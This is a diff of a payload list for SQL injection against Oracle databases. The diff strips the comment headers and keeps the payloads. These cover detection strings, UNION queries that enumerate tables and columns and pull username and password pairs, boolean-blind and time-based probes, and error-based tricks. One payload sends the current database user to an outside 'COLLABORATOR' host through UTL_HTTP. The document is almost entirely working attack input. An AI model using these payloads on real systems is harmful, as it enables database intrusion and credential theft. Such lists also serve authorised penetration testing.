@@ -1,63 +1,43 @@
-# ============================================================
-# SQL Injection — Oracle Database Specific
-# ============================================================
-
-# ---- Detection ----
 '
 '||'
 '||1=1||'
 ' --
 ' OR 1=1--
 
-# ---- Comments ----
 -- comment
 
-# ---- System Information ----
 ' UNION SELECT banner,NULL FROM v$version--
 ' UNION SELECT user,NULL FROM dual--
 ' UNION SELECT global_name,NULL FROM global_name--
 ' UNION SELECT SYS_CONTEXT('USERENV','DB_NAME'),NULL FROM dual--
 
-# ---- Dual Table (required in Oracle for SELECT without FROM) ----
 ' UNION SELECT NULL FROM dual--
 ' UNION SELECT NULL,NULL FROM dual--
 ' UNION SELECT NULL,NULL,NULL FROM dual--
 
-# ---- Enumerate Tables ----
 ' UNION SELECT table_name,NULL FROM all_tables--
 ' UNION SELECT table_name,NULL FROM user_tables--
 
-# ---- Enumerate Columns ----
 ' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
 
-# ---- String Concatenation ----
 ' UNION SELECT username||':'||password FROM users--
 ' UNION SELECT username||CHR(58)||password FROM users--
 
-# ---- Boolean Blind ----
 ' AND 1=1--
 ' AND 1=2--
 ' AND SUBSTR(username,1,1)='a' FROM users WHERE ROWNUM=1--
 
-# ---- Time-Based (DBMS_PIPE) ----
 ' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
 '; EXEC DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
 ' OR 1=DBMS_LOCK.SLEEP(5)--
 
-# ---- Error-Based (UTL_INADDR) ----
 ' AND UPPER(XMLType(CHR(60)||CHR(58)||CHR(47)||CHR(47)||(SELECT user FROM dual)||CHR(47)))>0--
 ' UNION SELECT UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual)),NULL FROM dual--
 
-# ---- OOB via UTL_HTTP ----
 ' UNION SELECT UTL_HTTP.REQUEST('https://COLLABORATOR/'||(SELECT user FROM dual)),NULL FROM dual--
 
-# ---- OOB via UTL_FILE ----
 ' UNION SELECT UTL_FILE.FGETATTR('DIR','file.txt'),NULL FROM dual--
 
-# ---- Stacked Queries (limited in Oracle) ----
-# Oracle doesn't support stacked queries in most contexts
-
-# ---- Bypass ----
 ' UNION SELECT NULL FROM DUAL--
 ' OR 1=1/*
 '||chr(49)||'='||chr(49)
